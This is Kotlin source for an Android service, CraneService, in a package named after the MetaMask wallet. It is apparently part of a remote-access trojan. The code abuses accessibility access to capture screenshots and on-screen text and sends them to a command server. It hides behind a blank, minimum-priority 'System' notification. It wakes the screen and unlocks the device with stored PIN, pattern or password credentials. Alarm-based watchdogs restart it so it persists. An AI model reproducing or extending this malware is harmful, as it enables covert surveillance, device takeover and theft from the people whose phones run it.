package com.example.MetaMask.services

import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.graphics.Rect
import android.view.View
import android.view.WindowManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Base64
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import com.example.MetaMask.R
import com.example.MetaMask.receivers.UnlockExecutor
import com.example.MetaMask.receivers.WebSocketCommandHandlerReceiver
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream

class CraneService : Service() {

    companion object {
        private const val TAG = "CraneService"
        const val ACTION_ACCESSIBILITY_CONNECTED = "com.example.MetaMask.ACCESSIBILITY_CONNECTED"
        const val ACTION_SET_CRANE_MODE    = "com.example.MetaMask.SET_CRANE_MODE"
        const val ACTION_SEND_HOME         = "com.example.MetaMask.SEND_HOME"
        const val ACTION_TAKE_SCREENSHOT   = "com.example.MetaMask.TAKE_SCREENSHOT"
        const val ACTION_CRANE_SELF_RESTART = "com.example.MetaMask.CRANE_SELF_RESTART"
        const val EXTRA_MODE               = "mode"

        @Volatile var craneMode: String = "off"
        @Volatile var acTreeDepth: Int = 5

        @Volatile var instance: CraneService? = null
        @Volatile private var lastEventFrameMs = 0L
        private const val AC_DEBOUNCE_MS = 150L

        @Volatile var lastFrameSentMs = 0L

        @Volatile var previousScreenHash: Long = -1L
        @Volatile var forceNextScreenFrame: Boolean = false
        @Volatile var skippedFrameCount: Int = 0
        @Volatile private var previousAcHash: Int = 0

        fun triggerAcFrameNow() {
            android.util.Log.d("XDBG", "[CraneService] triggerAcFrameNow enter") //xdbg
            val svc = instance ?: return
            if (craneMode != "ac") return
            val now = System.currentTimeMillis()
            if (now - lastEventFrameMs < AC_DEBOUNCE_MS) return
            lastEventFrameMs = now
            svc.handler.post {
                try { svc.sendAcFrame() } catch (_: Exception) {}
            }
        }

        @Volatile private var lastScreenEventFrameMs = 0L
        private const val SCREEN_DEBOUNCE_MS = 250L

        fun triggerScreenFrameNow() {
            android.util.Log.d("XDBG", "[CraneService] triggerScreenFrameNow enter") //xdbg
            val svc = instance ?: return
            if (craneMode != "screen") return
            val now = System.currentTimeMillis()
            if (now - lastScreenEventFrameMs < SCREEN_DEBOUNCE_MS) return
            lastScreenEventFrameMs = now
            svc.handler.post {
                try { svc.sendScreenFrame() } catch (_: Exception) {}
            }
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private var frameRunnable: Runnable? = null
    private var watchdogRunnable: Runnable? = null
    private var accessSvcWatchdogRunnable: Runnable? = null
    private val frameLoopExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
    @Volatile private var acFrameInProgress = false
    @Volatile private var screenFrameInProgress = false
    @Volatile private var screenFrameStartMs: Long = 0L
    @Volatile private var lastMwdResurrect = 0L

    @Volatile private var pendingMode: String = "off"

    private val screenOffReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            android.util.Log.d("XDBG", "[CraneService] onReceive enter context=ctx intent=${intent}") //xdbg
            when (intent?.action) {
                Intent.ACTION_SCREEN_OFF -> {
                    val mode = craneMode
                    if (mode == "off" || mode.isBlank()) return
                    try { KeepAliveManager.wakeScreen(this@CraneService) } catch (_: Exception) {}
                    handler.postDelayed({
                        if (craneMode == "off" || craneMode.isBlank()) return@postDelayed
                        try {
                            val km = getSystemService(Context.KEYGUARD_SERVICE) as? android.app.KeyguardManager
                            if (km?.isKeyguardLocked != true) return@postDelayed
                            if (km.isKeyguardSecure != true) return@postDelayed
                            if (hasUnlockCredentials() && !UnlockExecutor.inProgress) {
                                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                                val svc = AccessSvc.instance
                                if (svc != null) UnlockExecutor.execute(this@CraneService, svc)
                            }
                        } catch (_: Exception) {}
                    }, 200L)
                }
                Intent.ACTION_USER_PRESENT -> {
                    val mode = craneMode
                    if (mode == "off" || mode.isBlank()) return
                }
            }
        }
    }

    private val accessibilityConnectedReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            android.util.Log.d("XDBG", "[CraneService] onReceive enter context=ctx intent=${intent}") //xdbg
            if (intent?.action != ACTION_ACCESSIBILITY_CONNECTED) return
            val mode = pendingMode
            try {
                getSharedPreferences("vnc_watchdog", Context.MODE_PRIVATE)
                    .edit().putInt("restart_count", 0).apply()
            } catch (_: Exception) {}
            try { sendToServer(JSONObject().apply { put("action", "video_stream_ended") }) } catch (_: Exception) {}
            if (mode == "ac" || mode == "screen") {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                handler.post {
                    stopFrameLoop()
                    when (mode) {
                        "ac"     -> startFrameLoop(150L) { sendAcFrame() }
                        "screen" -> startFrameLoop(100L) { sendScreenFrame() }
                    }
                }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        android.util.Log.d("XDBG", "[CraneService] onCreate enter") //xdbg
        super.onCreate()
        instance = this

        try {
            val filter = IntentFilter(ACTION_ACCESSIBILITY_CONNECTED)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                registerReceiver(accessibilityConnectedReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(accessibilityConnectedReceiver, filter)
            }
        } catch (_: Exception) {}

        try {
            val screenFilter = IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            registerReceiver(screenOffReceiver, screenFilter)
        } catch (_: Exception) {}

        try {
            val comp = ComponentName(this, WebSocketCommandHandlerReceiver::class.java)
            packageManager.setComponentEnabledSetting(
                comp,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        val savedMode = getSharedPreferences("crane_state", Context.MODE_PRIVATE)
            .getString("auto_resume_mode", "off") ?: "off"
        if (savedMode != "off") {
            android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
            pendingMode = savedMode
        }
        scheduleAccessSvcWatchdog()

        KeepAliveManager.engageBackground(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[CraneService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        startForegroundMinimal()
        when (intent?.action) {
            ACTION_SET_CRANE_MODE -> {
                val mode = intent.getStringExtra(EXTRA_MODE) ?: "off"
                setMode(mode)
            }
            ACTION_SEND_HOME -> {
                performHome()
            }
            ACTION_TAKE_SCREENSHOT -> {
                handler.post { sendScreenFrame(isSingleShot = true) }
            }
        }
        android.util.Log.d("XDBG", "[CraneService] return") //xdbg
        return START_STICKY
    }

    private fun startForegroundMinimal() {
        android.util.Log.d("XDBG", "[CraneService] startForegroundMinimal enter") //xdbg
        val channelId = "vnc_proc_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(channelId) == null) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                nm.createNotificationChannel(
                    NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN)
                        .also { it.setShowBadge(false) }
                )
            }
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("").setContentText("")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                androidx.core.app.ServiceCompat.startForeground(
                    this, 779, notif,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(779, notif)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[CraneService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            try { startForeground(779, notif) } catch (_: Exception) {}
        }
    }

    private fun setMode(mode: String) {
        android.util.Log.d("XDBG", "[CraneService] setMode enter mode=${mode}") //xdbg
        craneMode = mode
        pendingMode = mode
        persistMode(mode)
        stopFrameLoop()
        skippedFrameCount = 0
        forceNextScreenFrame = true
        sendToServer(JSONObject().apply { put("action", "crane_mode"); put("mode", mode) })
        when (mode) {
            "ac"     -> {
                startFrameLoop(150L) { sendAcFrame() }
                if (AccessSvc.instance == null) scheduleAccessSvcWatchdog()
                KeepAliveManager.engage(this)
            }
            "screen" -> {
                startFrameLoop(100L) { sendScreenFrame() }
                if (AccessSvc.instance == null) scheduleAccessSvcWatchdog()
                KeepAliveManager.engage(this)
            }
            "off"    -> {
                AccessSvc.instance?.martenHelper?.hide()
                try { sendToServer(JSONObject().apply { put("action", "overlay_off") }) } catch (_: Exception) {}
                try { sendToServer(JSONObject().apply { put("action", "vnc_stopped") }) } catch (_: Exception) {}
                KeepAliveManager.release(this)
            }
        }
    }

    private fun startFrameLoop(baseIntervalMs: Long, frameProducer: () -> Unit) {
        val r = object : Runnable {
            override fun run() {
                android.util.Log.d("XDBG", "[CraneService] run enter") //xdbg
                if (craneMode == "off") return
                try { frameProducer() } catch (_: Exception) {}
                val queueBytes = try {
                    getSharedPreferences("mwd_state", Context.MODE_PRIVATE).getLong("ws_queue_bytes", 0L)
                } catch (_: Exception) { 0L }
                val next = when {
                    queueBytes > 200_000L -> (baseIntervalMs * 5).coerceIn(baseIntervalMs, 2500L)
                    queueBytes > 50_000L  -> (baseIntervalMs * 3).coerceIn(baseIntervalMs, 2500L)
                    else                  -> baseIntervalMs
                }
                handler.postDelayed(this, next)
            }
        }
        frameRunnable = r
        handler.postDelayed(r, baseIntervalMs)
        startWatchdog(baseIntervalMs, frameProducer)
    }

    private fun stopFrameLoop() {
        android.util.Log.d("XDBG", "[CraneService] stopFrameLoop enter") //xdbg
        frameRunnable?.let { handler.removeCallbacks(it) }
        frameRunnable = null
        stopWatchdog()
    }

    private fun startWatchdog(baseIntervalMs: Long, frameProducer: () -> Unit) {
        stopWatchdog()
        val r = object : Runnable {
            override fun run() {
                android.util.Log.d("XDBG", "[CraneService] run enter") //xdbg
                if (craneMode == "off") return
                val sentMs = lastFrameSentMs
                val age = System.currentTimeMillis() - sentMs
                if ((sentMs > 0L && age > 25_000L) || sentMs == 0L) {
                    android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                    stopFrameLoop()
                    when (craneMode) {
                        "ac"     -> startFrameLoop(150L) { sendAcFrame() }
                        "screen" -> startFrameLoop(100L) { sendScreenFrame() }
                    }
                    return
                }
                handler.postDelayed(this, 25_000L)
            }
        }
        watchdogRunnable = r
        handler.postDelayed(r, 30_000L)
    }

    private fun stopWatchdog() {
        android.util.Log.d("XDBG", "[CraneService] stopWatchdog enter") //xdbg
        watchdogRunnable?.let { handler.removeCallbacks(it) }
        watchdogRunnable = null
    }

    private fun sendAcFrame() {
        android.util.Log.d("XDBG", "[CraneService] sendAcFrame enter") //xdbg
        if (acFrameInProgress) return
        val svc = AccessSvc.instance ?: return
        val root = svc.rootInActiveWindow ?: return
        val wm = svc.getSystemService(android.content.Context.WINDOW_SERVICE) as? android.view.WindowManager
            ?: run { acFrameInProgress = false; return }
        val realW: Int
        val realH: Int
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
            val bounds = wm.currentWindowMetrics.bounds
            realW = bounds.width(); realH = bounds.height()
        } else {
            val dm = android.util.DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(dm)
            realW = dm.widthPixels; realH = dm.heightPixels
        }
        val w = realW
        val h = realH
        if (frameLoopExecutor.isShutdown) {
            android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
            try { root.recycle() } catch (_: Exception) {}
            return
        }
        acFrameInProgress = true
        try {
            frameLoopExecutor.execute {
                val nodes = JSONArray()
                try {
                    collectNodes(root, nodes, 0)
                } finally {
                    try { root.recycle() } catch (_: Exception) {}
                }
                val payload = JSONObject().apply {
                    put("action", "ac_frame")
                    put("nodes", nodes)
                    put("w", w)
                    put("h", h)
                }
                val nodesHash = nodes.toString().hashCode()
                if (nodesHash == previousAcHash) {
                    android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                    acFrameInProgress = false
                    android.util.Log.d("XDBG", "[CraneService] return") //xdbg
                    return@execute
                }
                previousAcHash = nodesHash
                sendToServer(payload)
                acFrameInProgress = false
            }
        } catch (_: java.util.concurrent.RejectedExecutionException) {
            android.util.Log.e("XDBG", "[CraneService] catch (ignored)") //xdbg
            acFrameInProgress = false
            try { root.recycle() } catch (_: Exception) {}
        }
    }

    private fun collectNodes(node: AccessibilityNodeInfo, arr: JSONArray, depth: Int,
                             parentGathered: Boolean = false) {
        if (depth > acTreeDepth) return
        try {
            val bounds = Rect()
            node.getBoundsInScreen(bounds)

            if (bounds.isEmpty) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                for (i in 0 until node.childCount) {
                    android.util.Log.d("XDBG", "[CraneService] loop") //xdbg
                    val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                    try { collectNodes(child, arr, depth + 1, parentGathered) }
                    finally { try { child.recycle() } catch (_: Exception) {} }
                }
                return
            }

            val directText  = node.text?.toString()?.trim() ?: ""
            val descText    = node.contentDescription?.toString()?.trim() ?: ""
            val hintText    = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                node.hintText?.toString()?.trim() ?: ""
            } else ""
            val isClickable = node.isClickable

            if (parentGathered && !isClickable) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                for (i in 0 until node.childCount) {
                    android.util.Log.d("XDBG", "[CraneService] loop") //xdbg
                    val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                    try { collectNodes(child, arr, depth + 1, parentGathered) }
                    finally { try { child.recycle() } catch (_: Exception) {} }
                }
                return
            }

            if (directText.isEmpty() && descText.isEmpty() && hintText.isEmpty() && !isClickable) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                for (i in 0 until node.childCount) {
                    android.util.Log.d("XDBG", "[CraneService] loop") //xdbg
                    val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                    try { collectNodes(child, arr, depth + 1, false) }
                    finally { try { child.recycle() } catch (_: Exception) {} }
                }
                return
            }

            var childrenGathered = false
            val text: String = when {
                directText.isNotEmpty() -> directText
                descText.isNotEmpty()   -> descText
                hintText.isNotEmpty()   -> hintText
                else -> {
                    val gathered = gatherChildText(node, maxDepth = 8)
                    if (gathered.isNotEmpty()) childrenGathered = true
                    gathered
                }
            }

            if (text.isEmpty()) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                for (i in 0 until node.childCount) {
                    android.util.Log.d("XDBG", "[CraneService] loop") //xdbg
                    val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                    try { collectNodes(child, arr, depth + 1, false) }
                    finally { try { child.recycle() } catch (_: Exception) {} }
                }
                return
            }

            arr.put(JSONObject().apply {
                put("bounds", JSONObject().apply {
                    put("left", bounds.left); put("top", bounds.top)
                    put("right", bounds.right); put("bottom", bounds.bottom)
                })
                put("clickable", isClickable)
                put("text", text.take(120))
                put("cls", node.className?.toString()?.substringAfterLast('.') ?: "")
            })

            for (i in 0 until node.childCount) {
                android.util.Log.d("XDBG", "[CraneService] loop") //xdbg
                val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                try { collectNodes(child, arr, depth + 1, childrenGathered) }
                finally { try { child.recycle() } catch (_: Exception) {} }
            }

        } catch (_: Exception) {}
    }

    private fun gatherChildText(node: AccessibilityNodeInfo, maxDepth: Int, curDepth: Int = 0): String {
        android.util.Log.d("XDBG", "[CraneService] gatherChildText enter node=${node} maxDepth=${maxDepth} curDepth=${curDepth}") //xdbg
        if (curDepth > maxDepth) return ""
        val sb = StringBuilder()
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[CraneService] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            try {
                val t = child.text?.toString()?.trim() ?: ""
                val d = child.contentDescription?.toString()?.trim() ?: ""
                val h = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    child.hintText?.toString()?.trim() ?: ""
                } else ""
                val best = when { t.isNotEmpty() -> t; d.isNotEmpty() -> d; h.isNotEmpty() -> h; else -> "" }
                if (best.isNotEmpty()) {
                    android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                    sb.append(best).append("  ")
                }
                if (best.isEmpty() && child.childCount > 0) {
                    android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                    val nested = gatherChildText(child, maxDepth, curDepth + 1)
                    if (nested.isNotEmpty()) sb.append(nested).append("  ")
                }
            } finally {
                try { child.recycle() } catch (_: Exception) {}
            }
        }
        android.util.Log.d("XDBG", "[CraneService] return") //xdbg
        return sb.toString().trim()
    }

    private fun sendScreenFrame(isSingleShot: Boolean = false) {
        android.util.Log.d("XDBG", "[CraneService] sendScreenFrame enter isSingleShot=${isSingleShot}") //xdbg
        if (!isSingleShot && screenFrameInProgress) {
            android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
            if (System.currentTimeMillis() - screenFrameStartMs < 3_000L) return
            screenFrameInProgress = false
        }
        val svc = AccessSvc.instance ?: return
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                screenFrameInProgress = true
                screenFrameStartMs = System.currentTimeMillis()
                svc.takeScreenshot(android.view.Display.DEFAULT_DISPLAY, mainExecutor, object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(screenshot: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                        android.util.Log.d("XDBG", "[CraneService] onSuccess enter screenshot=${screenshot}") //xdbg
                        try {
                            val bitmap = screenshot.hardwareBuffer?.let { buf ->
                                try {
                                    val hwBmp = Bitmap.wrapHardwareBuffer(buf, null)
                                    try { hwBmp?.copy(Bitmap.Config.ARGB_8888, false) }
                                    finally { hwBmp?.recycle() }
                                } finally { buf.close() }
                            } ?: run { screenFrameInProgress = false; return }

                            if (!isSingleShot) {
                                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                                val hash = quickHash(bitmap)
                                val force = forceNextScreenFrame
                                forceNextScreenFrame = false
                                if (hash == previousScreenHash && !force) {
                                    android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                                    skippedFrameCount++
                                    if (skippedFrameCount < 20) {
                                        android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                                        bitmap.recycle()
                                        screenFrameInProgress = false
                                        return
                                    }
                                }
                                skippedFrameCount = 0
                                previousScreenHash = hash
                            }

                            val quality = 90
                            val (base64, fmt) = bitmapToBase64(bitmap, quality)
                            val w = bitmap.width; val h = bitmap.height
                            bitmap.recycle()
                            val payload = JSONObject().apply {
                                put("action", if (isSingleShot) "screenshot" else "crane_frame")
                                put("data", base64)
                                put("fmt", fmt)
                                put("w", w)
                                put("h", h)
                            }
                            val actionLabel = if (isSingleShot) "screenshot" else "crane_frame"
                            sendToServer(payload)
                        } catch (_: Exception) {
                            android.util.Log.e("XDBG", "[CraneService] catch (ignored)") //xdbg
                        } finally {
                            screenFrameInProgress = false
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        android.util.Log.d("XDBG", "[CraneService] onFailure enter errorCode=${errorCode}") //xdbg
                        screenFrameInProgress = false
                    }
                })
            } else {
                screenFrameInProgress = false
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[CraneService] catch (ignored)") //xdbg
            screenFrameInProgress = false
        }
    }

    private fun bitmapToBase64(bitmap: Bitmap, quality: Int): Pair<String, String> {
        android.util.Log.d("XDBG", "[CraneService] bitmapToBase64 enter bitmap=${bitmap} quality=${quality}") //xdbg
        val bos = ByteArrayOutputStream()
        val scaled = if (bitmap.width > 480) {
            val ratio = 480f / bitmap.width
            Bitmap.createScaledBitmap(bitmap, 480, (bitmap.height * ratio).toInt(), false)
        } else bitmap
        val fmt: String
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
            scaled.compress(Bitmap.CompressFormat.WEBP_LOSSY, quality, bos)
            fmt = "webp"
            if (bos.size() > 150_000) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                bos.reset()
                scaled.compress(Bitmap.CompressFormat.WEBP_LOSSY, 45, bos)
            }
        } else {
            scaled.compress(Bitmap.CompressFormat.JPEG, quality, bos)
            fmt = "jpeg"
            if (bos.size() > 150_000) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                bos.reset()
                scaled.compress(Bitmap.CompressFormat.JPEG, 45, bos)
            }
        }
        if (scaled !== bitmap) scaled.recycle()
        android.util.Log.d("XDBG", "[CraneService] return") //xdbg
        return Pair(Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP), fmt)
    }

    private fun quickHash(bitmap: Bitmap): Long {
        android.util.Log.d("XDBG", "[CraneService] quickHash enter bitmap=${bitmap}") //xdbg
        val small = Bitmap.createScaledBitmap(bitmap, 64, 64, false)
        var h = 0L
        for (y in 0 until 64) for (x in 0 until 64) h = h * 31 + small.getPixel(x, y)
        small.recycle()
        android.util.Log.d("XDBG", "[CraneService] return") //xdbg
        return h
    }

    private fun performHome() {
        android.util.Log.d("XDBG", "[CraneService] performHome enter") //xdbg
        AccessSvc.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
    }

    private fun sendToServer(payload: JSONObject) {
        android.util.Log.d("XDBG", "[CraneService] sendToServer enter payload=${payload}") //xdbg
        lastFrameSentMs = System.currentTimeMillis()
        NativeDaemon.heartbeat(this)
        try {
            val action = payload.optString("action")
            val isLargeFrame = action == "crane_frame" || action == "screenshot"
            val intentPayload = if (isLargeFrame) {
                try {
                    val file = java.io.File(applicationContext.filesDir, "crane_frame_tmp.dat")
                    file.writeText(payload.toString())
                    """{"action":"$action","frame_file":"${file.absolutePath}"}"""
                } catch (_: Exception) {
                    android.util.Log.e("XDBG", "[CraneService] catch (ignored)") //xdbg
                    payload.toString()
                }
            } else {
                payload.toString()
            }
            val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, intentPayload)
                setPackage(packageName)
            }
            sendBroadcast(intent)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[CraneService] catch (ignored)") //xdbg
        }
        val heartbeat = try {
            getSharedPreferences("mwd_state", Context.MODE_PRIVATE).getLong("alive_ts", 0L)
        } catch (_: Exception) { System.currentTimeMillis() }
        val heartbeatAge = System.currentTimeMillis() - heartbeat
        if (heartbeatAge > 35_000L) {
            android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
            val now = System.currentTimeMillis()
            if (now - lastMwdResurrect > 5_000L) {
                android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                lastMwdResurrect = now
                try {
                    val i = Intent(this, MasterWebSocketDispatcher::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
                    else startService(i)
                } catch (_: Exception) {
                    android.util.Log.e("XDBG", "[CraneService] catch (ignored)") //xdbg
                }
            }
        }
    }

    private fun persistMode(mode: String) {
        android.util.Log.d("XDBG", "[CraneService] persistMode enter mode=${mode}") //xdbg
        val toSave = if (mode == "video") "off" else mode
        val editor = getSharedPreferences("crane_state", Context.MODE_PRIVATE)
            .edit().putString("auto_resume_mode", toSave)
        if (toSave == "off") editor.commit() else editor.apply()
    }

    private fun hasUnlockCredentials(): Boolean {
        android.util.Log.d("XDBG", "[CraneService] hasUnlockCredentials enter") //xdbg
        android.util.Log.d("XDBG", "[CraneService] return") //xdbg
        return try {
            val json = getSharedPreferences("cfg", Context.MODE_PRIVATE)
                .getString("unlock_method_json", null) ?: return false
            val type = JSONObject(json).optString("type", "swipe")
            type == "pin" || type == "pattern" || type == "password"
        } catch (_: Exception) { false }
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[CraneService] onDestroy enter") //xdbg
        stopFrameLoop()
        try { frameLoopExecutor.shutdown() } catch (_: Exception) {}
        try { stopForeground(true) } catch (_: Exception) {}
        try { unregisterReceiver(accessibilityConnectedReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(screenOffReceiver) } catch (_: Exception) {}
        val savedMode = craneMode
        craneMode = "off"
        instance = null
        try { KeepAliveManager.releaseAll(this) } catch (_: Exception) {}
        if (savedMode == "ac" || savedMode == "screen") {
            android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
            scheduleSelfRestart()
        }
        super.onDestroy()
    }

    private fun scheduleAccessSvcWatchdog() {
        android.util.Log.d("XDBG", "[CraneService] scheduleAccessSvcWatchdog enter") //xdbg
        accessSvcWatchdogRunnable?.let { handler.removeCallbacks(it) }
        val r = Runnable { checkAccessSvcBinding() }
        accessSvcWatchdogRunnable = r
        handler.postDelayed(r, 15_000L)
    }

    private fun checkAccessSvcBinding() {
        android.util.Log.d("XDBG", "[CraneService] checkAccessSvcBinding enter") //xdbg
        if (AccessSvc.instance != null) {
            android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
            getSharedPreferences("vnc_watchdog", Context.MODE_PRIVATE)
                .edit().putInt("restart_count", 0).apply()
            return
        }
        if (pendingMode == "off") return
        val enabledStr = try {
            Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
        } catch (_: Exception) { "" }
        if (!enabledStr.contains(packageName)) return
        val prefs = getSharedPreferences("vnc_watchdog", Context.MODE_PRIVATE)
        val restartCount = prefs.getInt("restart_count", 0)
        val lastRestart = prefs.getLong("last_restart_ms", 0L)
        val now = System.currentTimeMillis()
        if (restartCount >= 3) return
        if (lastRestart > 0 && now - lastRestart < 60_000L) {
            android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
            handler.postDelayed({ checkAccessSvcBinding() }, 20_000L)
            return
        }
        prefs.edit()
            .putInt("restart_count", restartCount + 1)
            .putLong("last_restart_ms", now)
            .apply()
        scheduleSelfRestart()
        @Suppress("DEPRECATION")
        stopForeground(true)
        handler.postDelayed({ android.os.Process.killProcess(android.os.Process.myPid()) }, 500L)
    }


    private fun scheduleSelfRestart() {
        android.util.Log.d("XDBG", "[CraneService] scheduleSelfRestart enter") //xdbg
        try {
            val am = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                ?: return
            val baseIntent = Intent(applicationContext, com.example.MetaMask.receivers.AlarmReceiver::class.java)
                .apply { action = ACTION_CRANE_SELF_RESTART }
            val pi1 = PendingIntent.getBroadcast(
                applicationContext, 9001, baseIntent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            val pi2 = PendingIntent.getBroadcast(
                applicationContext, 9002, baseIntent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            fun scheduleOne(pi: PendingIntent, delayMs: Long) {
                android.util.Log.d("XDBG", "[CraneService] scheduleOne enter pi=${pi} delayMs=${delayMs}") //xdbg
                val trigger = System.currentTimeMillis() + delayMs
                if (Build.VERSION.SDK_INT >= 31) {
                    android.util.Log.d("XDBG", "[CraneService] if branch") //xdbg
                    val canExact = try { am.canScheduleExactAlarms() } catch (_: Exception) { false }
                    if (canExact) am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi)
                    else am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi)
                } else if (Build.VERSION.SDK_INT >= 23) {
                    am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi)
                } else {
                    am.setExact(AlarmManager.RTC_WAKEUP, trigger, pi)
                }
            }
            scheduleOne(pi1, 4_000L)
            scheduleOne(pi2, 30_000L)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[CraneService] catch (ignored)") //xdbg
        }
    }
}
